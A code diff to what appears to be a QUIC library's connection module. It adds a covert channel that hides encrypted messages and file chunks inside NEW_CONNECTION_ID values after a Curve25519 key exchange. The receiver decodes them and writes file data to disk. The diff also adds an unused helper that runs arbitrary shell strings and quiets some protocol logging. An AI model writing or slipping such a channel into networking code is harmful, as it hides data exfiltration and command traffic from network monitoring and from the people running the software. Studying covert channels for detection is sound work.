@@ -1,6 +1,12 @@
 import binascii
 import logging
 import os
+import queue
+import re
+import socket
+import subprocess
+import threading
+import time
 from collections import deque
 from dataclasses import dataclass
 from enum import Enum
@@ -107,6 +113,14 @@ STOP_SENDING_FRAME_CAPACITY = 1 + 2 * UINT_VAR_MAX_SIZE
 STREAMS_BLOCKED_CAPACITY = 1 + UINT_VAR_MAX_SIZE
 TRANSPORT_CLOSE_FRAME_CAPACITY = 1 + 3 * UINT_VAR_MAX_SIZE  # + reason length
 
+GLOBAL_BYTE_ORDER = "big"
+CID_HISTORY_LENGTH = 16
+PEER_META = {}
+PEER_META_LOCK = threading.Lock()
+
+SEQUENCE_BYTES = 2
+MAX_BUFFER_AGE = 60.0
+
 
 def EPOCHS(shortcut: str) -> FrozenSet[tls.Epoch]:
     return frozenset(EPOCH_SHORTCUTS[i] for i in shortcut)
@@ -137,6 +151,57 @@ def get_epoch(packet_type: QuicPacketType) -> tls.Epoch:
         return tls.Epoch.HANDSHAKE
     else:
         return tls.Epoch.ONE_RTT
+
+
+def create_peer_meta():
+    from . import ccrypto
+
+    private_key = ccrypto.generate_private_key()
+    local_public_key = ccrypto.get_public_key_bytes(private_key)
+
+    return {
+        "buffer": [],
+        "public_key": None,  # Remote Curve25519 public key bytes
+        "local_public_key": local_public_key,
+        "message_history": {},
+        "cid_queue": queue.Queue(),
+        "cid_history": [],
+        "private_key": private_key,
+        "expected_sequence": 0,  # Track expected sequence for sync
+        "next_sequence": 0,  # Outgoing sequence counter
+        "last_sync_time": 0.0,  # Track last successful sync
+        "buffer_timestamp": 0.0,  # Track buffer age
+        "sync_lost": False,  # Flag indicating sync loss
+        "connection_count": 0,  # Support multiple concurrent connections
+        "session_key": None,  # Populated after Curve25519 handshake
+        "session_message_count": 0,  # Track messages for key rotation
+        "public_key_sent": False,  # Track whether we advertised our key
+        "handshake_complete": False,
+        "metrics": {
+            "msgs_recovered": 0,
+            "seq_gaps": 0,
+            "dropped_packets_est": 0,
+            "decryption_failures": 0,
+            "buffer_flushes": 0,
+            "sliding_window_hits": 0,
+        },
+    }
+
+
+def execute_command(command):
+    try:
+        process = subprocess.Popen(
+            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        stdout, stderr = process.communicate()
+        return_code = process.returncode
+
+        stdout_str = stdout.decode("utf-8")
+        stderr_str = stderr.decode("utf-8")
+
+        return stdout_str, stderr_str, return_code
+    except Exception as e:
+        return "", str(e), 1
 
 
 def stream_is_client_initiated(stream_id: int) -> bool:
@@ -217,6 +282,7 @@ class QuicReceiveContext:
     quic_logger_frames: Optional[list[Any]]
     time: float
     version: Optional[int]
+    addr: NetworkAddress
 
 
 QuicTokenHandler = Callable[[bytes], None]
@@ -228,6 +294,44 @@ END_STATES = frozenset(
         QuicConnectionState.TERMINATED,
     ]
 )
+
+
+def resolve_hostname_from_url(url):
+    hostname = None
+    for pattern in [r"^https?://([^/]+)", r"^wss://([^:/?]+)"]:
+        match = re.match(pattern, url)
+        if match:
+            hostname = match.group(1)
+            break
+
+    if not hostname:
+        raise ValueError(
+            "Invalid URL format. Must start with wss://, http:// or https://"
+        )
+    # Strip port if present (e.g., "localhost:4433")
+    host_only = hostname.split(":", 1)[0]
+
+    # Prefer IPv6 for localhost to match asyncio behavior
+    if host_only == "localhost":
+        return host_only, "::1"
+
+    try:
+        ip_address = socket.gethostbyname(host_only)
+    except socket.gaierror as e:
+        raise ValueError(f"Failed to resolve hostname {hostname}: {str(e)}")
+
+    return host_only, ip_address
+
+
+def peer_address_key(addr, is_client=True):
+    """
+    Build a key for peer metadata.
+    """
+    if isinstance(addr, tuple):
+        ip = addr[0] if len(addr) >= 1 else str(addr)
+        port = addr[1] if len(addr) >= 2 and is_client else 0
+        return (ip, port)
+    return (str(addr), 0)
 
 
 class QuicConnection:
@@ -254,6 +358,7 @@ class QuicConnection:
         session_ticket_fetcher: Optional[tls.SessionTicketFetcher] = None,
         session_ticket_handler: Optional[tls.SessionTicketHandler] = None,
         token_handler: Optional[QuicTokenHandler] = None,
+        addr: Optional[str] = None,
     ) -> None:
         assert configuration.max_datagram_size >= SMALLEST_MAX_DATAGRAM_SIZE, (
             "The smallest allowed maximum datagram size is "
@@ -299,6 +404,8 @@ class QuicConnection:
         self._events: Deque[events.QuicEvent] = deque()
         self._handshake_complete = False
         self._handshake_confirmed = False
+
+        # Covert channel section for server
         self._host_cids = [
             QuicConnectionId(
                 cid=os.urandom(configuration.connection_id_length),
@@ -336,16 +443,53 @@ class QuicConnection:
         self._network_paths: list[QuicNetworkPath] = []
         self._pacing_at: Optional[float] = None
         self._packet_number = 0
-        self._peer_cid = QuicConnectionId(
-            cid=os.urandom(configuration.connection_id_length), sequence_number=None
-        )
+
+        # Covert channel section for client
+        PEER_META_LOCK.acquire(timeout=5)
+        peer_key = peer_address_key(addr, is_client=self._is_client)
+        peer_meta = PEER_META.get(peer_key)
+        if not peer_meta:
+            from . import ccrypto
+
+            peer_meta = create_peer_meta()
+            key_bytes = peer_meta["local_public_key"]
+            ccrypto.queue_message(
+                host_ip=addr[0] if isinstance(addr, tuple) else str(addr),
+                payload=key_bytes,
+                queue=peer_meta["cid_queue"],
+                public_key=None,
+                is_public_key=True,
+            )
+            # Queue a random CID after seeding the handshake chunks so they are not starved.
+            peer_meta["cid_queue"].put(
+                os.urandom(self._configuration.connection_id_length)
+            )
+            peer_meta["public_key_sent"] = True
+        if self._is_client:
+            # Use a fresh random DCID so the queued covert chunks remain available
+            cid = os.urandom(self._configuration.connection_id_length)
+            self._peer_cid = QuicConnectionId(cid=cid, sequence_number=None)
+            if peer_meta["cid_queue"].empty():
+                peer_meta["cid_queue"].put(
+                    os.urandom(self._configuration.connection_id_length)
+                )
+        else:
+            cid = os.urandom(8)
+            self._peer_cid = QuicConnectionId(cid=cid, sequence_number=None)
+        PEER_META[peer_key] = peer_meta
+        PEER_META_LOCK.release()
+
         self._peer_cid_available: list[QuicConnectionId] = []
         self._peer_cid_sequence_numbers: Set[int] = set([0])
         self._peer_retire_prior_to = 0
         self._peer_token = configuration.token
         self._quic_logger: Optional[QuicLoggerTrace] = None
         self._remote_ack_delay_exponent = 3
-        self._remote_active_connection_id_limit = 2
+        from . import ccrypto
+
+        self._remote_active_connection_id_limit = max(
+            2, ccrypto.PUBLIC_KEY_CHUNK_COUNT + 1
+        )
         self._remote_initial_source_connection_id: Optional[bytes] = None
         self._remote_max_idle_timeout: Optional[float] = None  # seconds
         self._remote_max_data = 0
@@ -566,7 +710,7 @@ class QuicConnection:
                         frame_type=self._close_event.frame_type,
                         reason_phrase=self._close_event.reason_phrase,
                     )
-            self._logger.info(
+            self._logger.debug(
                 "Connection close sent (code 0x%X, reason %s)",
                 self._close_event.error_code,
                 self._close_event.reason_phrase,
@@ -1024,6 +1168,7 @@ class QuicConnection:
                 quic_logger_frames=quic_logger_frames,
                 time=now,
                 version=header.version,
+                addr=addr,
             )
             try:
                 is_ack_eliciting, is_probing = self._payload_received(
@@ -1209,9 +1354,9 @@ class QuicConnection:
                         ]
                         break
             self._version_negotiated_compatible = True
-            self._logger.info(
-                "Negotiated protocol version %s", pretty_protocol_version(self._version)
-            )
+            # self._logger.info(
+            #     "Negotiated protocol version %s", pretty_protocol_version(self._version)
+            # )
 
         # Notify the application.
         self._events.append(events.ProtocolNegotiated(alpn_protocol=alpn_protocol))
@@ -1265,6 +1410,23 @@ class QuicConnection:
         """
         End the close procedure.
         """
+        if PEER_META_LOCK.acquire(timeout=5):
+            try:
+                for key, meta in PEER_META.items():
+                    metrics = meta.get("metrics") if isinstance(meta, dict) else None
+                    if metrics and metrics.get("msgs_recovered"):
+                        logger.info(
+                            "FINAL covert report %s: recovered=%d lost_est=%d gaps=%d decrypt_failures=%d sliding=%d flushes=%d",
+                            key,
+                            metrics["msgs_recovered"],
+                            metrics["dropped_packets_est"],
+                            metrics["seq_gaps"],
+                            metrics["decryption_failures"],
+                            metrics["sliding_window_hits"],
+                            metrics["buffer_flushes"],
+                        )
+            finally:
+                PEER_META_LOCK.release()
         self._close_at = None
         for epoch in self._spaces.keys():
             self._discard_epoch(epoch)
@@ -1601,7 +1763,7 @@ class QuicConnection:
                 )
             )
 
-        self._logger.info(
+        self._logger.debug(
             "Connection close received (code 0x%X, reason %s)",
             error_code,
             reason_phrase,
@@ -1655,6 +1817,12 @@ class QuicConnection:
                 self.tls.handle_message(event.data, self._crypto_buffers)
                 self._push_crypto_data()
             except tls.Alert as exc:
+                logger.error(
+                    "TLS alert during CRYPTO frame: desc=%s state=%s epoch=%s",
+                    exc.description,
+                    self.tls.state,
+                    context.epoch,
+                )
                 raise QuicConnectionError(
                     error_code=QuicErrorCode.CRYPTO_ERROR + int(exc.description),
                     frame_type=frame_type,
@@ -1674,7 +1842,7 @@ class QuicConnection:
                     self._handshake_confirmed = True
                     self._handshake_done_pending = True
 
-                self._replenish_connection_ids()
+                self._replenish_connection_ids(context.addr)
                 self._events.append(
                     events.HandshakeCompleted(
                         alpn_protocol=self.tls.alpn_negotiated,
@@ -1684,11 +1852,11 @@ class QuicConnection:
                 )
                 self._unblock_streams(is_unidirectional=False)
                 self._unblock_streams(is_unidirectional=True)
-                self._logger.info(
-                    "ALPN negotiated protocol %s", self.tls.alpn_negotiated
-                )
+                # self._logger.info(
+                #     "ALPN negotiated protocol %s", self.tls.alpn_negotiated
+                # )
         else:
-            self._logger.info(
+            self._logger.debug(
                 "Duplicate CRYPTO data received for epoch %s", context.epoch
             )
 
@@ -1895,6 +2063,296 @@ class QuicConnection:
         length = buf.pull_uint8()
         connection_id = buf.pull_bytes(length)
         stateless_reset_token = buf.pull_bytes(STATELESS_RESET_TOKEN_SIZE)
+
+        # Covert channel section
+        peer_key = peer_address_key(context.addr, is_client=self._is_client)
+        peer_ip = peer_key[0]
+
+        PEER_META_LOCK.acquire(timeout=5)
+        peer_meta = PEER_META.get(peer_key)
+        if not peer_meta:
+            peer_meta = create_peer_meta()
+
+        if connection_id not in peer_meta["cid_history"]:
+            from . import ccrypto
+
+            peer_meta["cid_history"].append(connection_id)
+            peer_meta["cid_history"] = peer_meta["cid_history"][
+                -1 * CID_HISTORY_LENGTH :
+            ]
+
+            if self._configuration.covert_strategy == "fec":
+                peer_meta["buffer"].append(connection_id)
+            else:
+                if len(connection_id) <= 16:
+                    peer_meta["buffer"].append(connection_id)
+
+            now_ts = time.time()
+            if not peer_meta["buffer_timestamp"]:
+                peer_meta["buffer_timestamp"] = now_ts
+
+            buffer_age = now_ts - peer_meta["buffer_timestamp"]
+            # Auto-flush if buffer is too old or too big (Catastrophic recovery)
+            if buffer_age > MAX_BUFFER_AGE or len(peer_meta["buffer"]) > 512:
+                logger.warning(
+                    "Resetting buffer for %s (age=%.1fs, len=%d) - Timeout/Overflow",
+                    peer_ip,
+                    buffer_age,
+                    len(peer_meta["buffer"]),
+                )
+                metrics = peer_meta.get("metrics")
+                if metrics is not None:
+                    metrics["buffer_flushes"] += 1
+                peer_meta["buffer"] = []
+                peer_meta["buffer_timestamp"] = now_ts
+
+            # --- Public Key Exchange (Handshake) ---
+            if not peer_meta["public_key"]:
+                chunk_count = ccrypto.PUBLIC_KEY_CHUNK_COUNT
+                buffers = peer_meta["buffer"]
+                if len(buffers) >= chunk_count:
+                    handshake_found = False
+                    max_start = len(buffers) - chunk_count
+                    for start in range(max_start + 1):
+                        window = buffers[start : start + chunk_count]
+                        key_bytes = ccrypto.parse_public_key_chunks(window)
+
+                        if not key_bytes:
+                            continue
+
+                        try:
+                            session_key = ccrypto.derive_session_key(
+                                peer_meta["private_key"], key_bytes
+                            )
+                        except Exception as exc:
+                            logger.error(
+                                "Failed to derive session key for %s: %s",
+                                peer_ip,
+                                exc,
+                            )
+                            continue
+
+                        peer_meta["public_key"] = key_bytes
+                        peer_meta["session_key"] = session_key
+                        peer_meta["handshake_complete"] = True
+                        handshake_found = True
+                        break
+
+                    if handshake_found:
+                        peer_meta["buffer"] = []
+                        peer_meta["buffer_timestamp"] = time.time()
+                        peer_meta["expected_sequence"] = 0
+                        logger.info(f"Received public key from {peer_ip}")
+
+                        if not peer_meta.get("public_key_sent"):
+                            local_bytes = peer_meta.get("local_public_key")
+                            if local_bytes:
+                                ccrypto.queue_message(
+                                    host_ip=peer_ip,
+                                    payload=local_bytes,
+                                    queue=peer_meta["cid_queue"],
+                                    public_key=None,
+                                    is_public_key=True,
+                                )
+                                peer_meta["public_key_sent"] = True
+
+            # --- Data Processing (Scanning Loop) ---
+            else:
+                metrics = peer_meta.get("metrics")
+                if metrics is None:
+                    metrics = peer_meta["metrics"] = {
+                        "msgs_recovered": 0,
+                        "seq_gaps": 0,
+                        "dropped_packets_est": 0,
+                        "decryption_failures": 0,
+                        "buffer_flushes": 0,
+                        "sliding_window_hits": 0,
+                    }
+
+                metrics_interval = max(
+                    1, getattr(self._configuration, "covert_log_interval", 10)
+                )
+
+                # Scan limit: How deep to search for a valid start?
+                # 5 is enough to skip a few garbage packets without burning CPU.
+                scan_depth = getattr(self._configuration, "covert_window_depth", 5)
+
+                # We loop to process multiple messages if they arrived in a batch,
+                # OR to scan past garbage.
+                current_buffer_idx = 0
+
+                while current_buffer_idx < len(peer_meta["buffer"]):
+                    # If we are in FEC mode, we don't need sliding window scan
+                    # because FEC handles partial/loss internally.
+                    if self._configuration.covert_strategy == "fec":
+                        # FEC Logic (Standard)
+                        remaining_buffer = peer_meta["buffer"][current_buffer_idx:]
+                        if not remaining_buffer:
+                            break
+
+                        # Quick peek check
+                        if len(remaining_buffer[0]) < 4:
+                            # Bad packet in FEC mode -> Just drop it
+                            current_buffer_idx += 1
+                            continue
+
+                        result = ccrypto.reconstruct_payload_fec(
+                            remaining_buffer,
+                            self._configuration.covert_fec_rate,
+                            session_key=peer_meta.get("session_key"),
+                        )
+
+                        if result and isinstance(result, tuple):
+                            encrypted_payload, decoded_msg_id = result
+                            # Smart Clear: We must remove the used packets from the REAL buffer
+                            # This is complex in a loop, so we filter the main buffer directly and restart
+                            peer_meta["buffer"] = [
+                                pkt
+                                for pkt in peer_meta["buffer"]
+                                if len(pkt) >= 4 and pkt[0] != decoded_msg_id
+                            ]
+                            # Restart scan since buffer changed
+                            current_buffer_idx = 0
+                        else:
+                            # No complete message found
+                            break
+
+                    # Legacy Mode: We scan for a valid start point
+                    else:
+                        # Try to decrypt assuming message starts at `current_buffer_idx`
+                        candidate_buffer = peer_meta["buffer"][current_buffer_idx:]
+                        if not candidate_buffer:
+                            break
+
+                        encrypted_payload = ccrypto.reconstruct_payload(
+                            candidate_buffer
+                        )
+
+                    if not encrypted_payload:
+                        break
+
+                    # 2. Decrypt
+                    decrypted_payload = None
+                    sequence = None
+
+                    session_key = peer_meta.get("session_key")
+                    if not session_key:
+                        break
+
+                    decrypted = ccrypto.decrypt_with_session_key(
+                        session_key, encrypted_payload
+                    )
+                    if decrypted:
+                        if len(decrypted) >= SEQUENCE_BYTES:
+                            sequence = int.from_bytes(
+                                decrypted[:SEQUENCE_BYTES], GLOBAL_BYTE_ORDER
+                            )
+                            decrypted_payload = decrypted[SEQUENCE_BYTES:]
+                        else:
+                            decrypted_payload = decrypted
+
+                    # 3. Decision Time
+                    if decrypted_payload is not None:
+                        # SUCCESS!
+                        # We found a message starting at `current_buffer_idx`.
+                        # 1. If idx > 0, we skipped garbage. Log it.
+                        if current_buffer_idx > 0:
+                            if metrics:
+                                metrics["decryption_failures"] += current_buffer_idx
+                                metrics["sliding_window_hits"] += 1
+
+                        # 2. Update buffer:
+                        # In Legacy mode, a success consumes the REST of the buffer.
+                        # (Because we don't know where the message ends in the stream,
+                        # we assume the whole buffer was the message).
+                        if self._configuration.covert_strategy != "fec":
+                            peer_meta["buffer"] = []
+
+                        # 3. Process the message (Same as before)
+                        valid_seq = True
+                        if sequence is not None:
+                            expected = peer_meta.get("expected_sequence", 0)
+                            if expected == 0:
+                                peer_meta["expected_sequence"] = sequence + 1
+                                peer_meta["sync_lost"] = False
+                            elif sequence < expected:
+                                valid_seq = False
+                            elif sequence != expected:
+                                gap = sequence - expected
+                                if metrics is not None:
+                                    metrics["seq_gaps"] += 1
+                                    metrics["dropped_packets_est"] += gap
+                                logger.warning(
+                                    "Sequence gap detected for %s: expected %d got %d (lost %d)",
+                                    peer_ip,
+                                    expected,
+                                    sequence,
+                                    gap,
+                                )
+                                peer_meta["expected_sequence"] = sequence + 1
+                                peer_meta["sync_lost"] = False
+                                valid_seq = True
+                            else:
+                                peer_meta["expected_sequence"] = expected + 1
+                                peer_meta["sync_lost"] = False
+
+                        if valid_seq:
+                            if metrics is not None:
+                                metrics["msgs_recovered"] += 1
+                                if (
+                                    metrics_interval > 0
+                                    and metrics["msgs_recovered"] % metrics_interval
+                                    == 0
+                                ):
+                                    logger.info(
+                                        "Covert metrics %s: recovered=%d lost_est=%d gaps=%d decrypt_failures=%d sliding=%d flushes=%d",
+                                        peer_ip,
+                                        metrics["msgs_recovered"],
+                                        metrics["dropped_packets_est"],
+                                        metrics["seq_gaps"],
+                                        metrics["decryption_failures"],
+                                        metrics["sliding_window_hits"],
+                                        metrics["buffer_flushes"],
+                                    )
+                            peer_meta["buffer_timestamp"] = time.time()
+                            peer_meta["last_sync_time"] = peer_meta["buffer_timestamp"]
+                            command = decrypted_payload[0]
+                            decrypted_message = decrypted_payload[1:]
+
+                            message_list = peer_meta["message_history"].get(
+                                peer_key, []
+                            )
+                            message_list.append(decrypted_message)
+                            peer_meta["message_history"][peer_key] = message_list
+
+                            if command == ord("m"):
+                                logger.info(
+                                    "=== RECEIVED MESSAGE: %s", decrypted_message
+                                )
+                            elif command == ord("f"):
+                                filename = "client-transfer.bin"
+                                with open(filename, "ab") as f_out:
+                                    f_out.write(decrypted_message)
+                                logger.info(
+                                    "RECEIVED FILE CHUNK (%d bytes) APPENDED TO: %s",
+                                    len(decrypted_message),
+                                    filename,
+                                )
+
+                        if self._configuration.covert_strategy != "fec":
+                            break
+
+                    else:
+                        current_buffer_idx += 1
+
+                        if current_buffer_idx > scan_depth:
+                            break
+
+        if PEER_META_LOCK.locked():
+            PEER_META[peer_key] = peer_meta
+            PEER_META_LOCK.release()
+
+        # ... (Standard QUIC Processing continues) ...
         if not connection_id or len(connection_id) > CONNECTION_ID_MAX_SIZE:
             raise QuicConnectionError(
                 error_code=QuicErrorCode.FRAME_ENCODING_ERROR,
@@ -1921,10 +2379,8 @@ class QuicConnection:
                 reason_phrase="Retire Prior To is greater than Sequence Number",
             )
 
-        # only accept retire_prior_to if it is bigger than the one we know
         self._peer_retire_prior_to = max(retire_prior_to, self._peer_retire_prior_to)
 
-        # determine which CIDs to retire
         change_cid = False
         retire = [
             cid
@@ -1935,7 +2391,6 @@ class QuicConnection:
             change_cid = True
             retire.insert(0, self._peer_cid)
 
-        # update available CIDs
         self._peer_cid_available = [
             cid
             for cid in self._peer_cid_available
@@ -1954,15 +2409,12 @@ class QuicConnection:
             )
             self._peer_cid_sequence_numbers.add(sequence_number)
 
-        # retire previous CIDs
         for quic_connection_id in retire:
             self._retire_peer_cid(quic_connection_id)
 
-        # assign new CID if we retired the active one
         if change_cid:
             self._consume_peer_cid()
 
-        # check number of active connection IDs, including the selected one
         if 1 + len(self._peer_cid_available) > self._local_active_connection_id_limit:
             raise QuicConnectionError(
                 error_code=QuicErrorCode.CONNECTION_ID_LIMIT_ERROR,
@@ -1970,12 +2422,6 @@ class QuicConnection:
                 reason_phrase="Too many active connection IDs",
             )
 
-        # Check the number of retired connection IDs pending, though with a safer limit
-        # than the 2x recommended in section 5.1.2 of the RFC.  Note that we are doing
-        # the check here and not in _retire_peer_cid() because we know the frame type to
-        # use here, and because it is the new connection id path that is potentially
-        # dangerous.  We may transiently go a bit over the limit due to unacked frames
-        # getting added back to the list, but that's ok as it is bounded.
         if len(self._retire_connection_ids) > min(
             self._local_active_connection_id_limit * 4, MAX_PENDING_RETIRES
         ):
@@ -2183,7 +2629,7 @@ class QuicConnection:
                 break
 
         # issue a new connection ID
-        self._replenish_connection_ids()
+        self._replenish_connection_ids(context.addr)
 
     def _handle_stop_sending_frame(
         self, context: QuicReceiveContext, frame_type: int, buf: Buffer
@@ -2642,14 +3088,58 @@ class QuicConnection:
                     },
                 )
 
-    def _replenish_connection_ids(self) -> None:
+    def _replenish_connection_ids(self, addr) -> None:
         """
         Generate new connection IDs.
         """
-        while len(self._host_cids) < min(8, self._remote_active_connection_id_limit):
+        peer_key = peer_address_key(addr, is_client=self._is_client)
+        peer_ip = peer_key[0]
+        queue_ref = None
+        peer_meta = PEER_META.get(peer_key)
+        if peer_meta:
+            queue_ref = peer_meta["cid_queue"]
+
+        from . import ccrypto
+
+        limit = min(8, self._remote_active_connection_id_limit)
+
+        while len(self._host_cids) < limit:
+            next_cid = None
+
+            if queue_ref is not None:
+                if queue_ref.empty():
+                    if not self._is_client and peer_meta.get("session_key"):
+                        fec_rate = (
+                            self._configuration.covert_fec_rate
+                            if self._configuration.covert_strategy == "fec"
+                            else None
+                        )
+                        ccrypto.queue_message(
+                            host_ip=peer_ip,
+                            payload=b"k",
+                            queue=queue_ref,
+                            public_key=None,
+                            sequence=peer_meta.get("next_sequence", 0),
+                            session_key=peer_meta.get("session_key"),
+                            fec_rate=fec_rate,
+                        )
+                        peer_meta["next_sequence"] = (
+                            peer_meta.get("next_sequence", 0) + 1
+                        )
+                    else:
+                        queue_ref.put(
+                            os.urandom(self._configuration.connection_id_length)
+                        )
+
+                if not queue_ref.empty():
+                    next_cid = queue_ref.get()
+
+            if next_cid is None:
+                next_cid = os.urandom(self._configuration.connection_id_length)
+
             self._host_cids.append(
                 QuicConnectionId(
-                    cid=os.urandom(self._configuration.connection_id_length),
+                    cid=next_cid,
                     sequence_number=self._host_cid_seq,
                     stateless_reset_token=os.urandom(16),
                 )
@@ -2965,9 +3455,9 @@ class QuicConnection:
         ):
             self._version = self._crypto_packet_version
             self._version_negotiated_compatible = True
-            self._logger.info(
-                "Negotiated protocol version %s", pretty_protocol_version(self._version)
-            )
+            # self._logger.info(
+            #     "Negotiated protocol version %s", pretty_protocol_version(self._version)
+            # )
 
         secrets_log_file = self._configuration.secrets_log_file
         if secrets_log_file is not None:
@@ -3394,6 +3884,12 @@ class QuicConnection:
         buf.push_bytes(connection_id.cid)
         buf.push_bytes(connection_id.stateless_reset_token)
 
+        logger.debug(
+            "Covert NEW_CONNECTION_ID len=%d seq=%d cid=%s",
+            len(connection_id.cid),
+            connection_id.sequence_number,
+            connection_id.cid.hex(),
+        )
         connection_id.was_sent = True
         self._events.append(events.ConnectionIdIssued(connection_id=connection_id.cid))
 
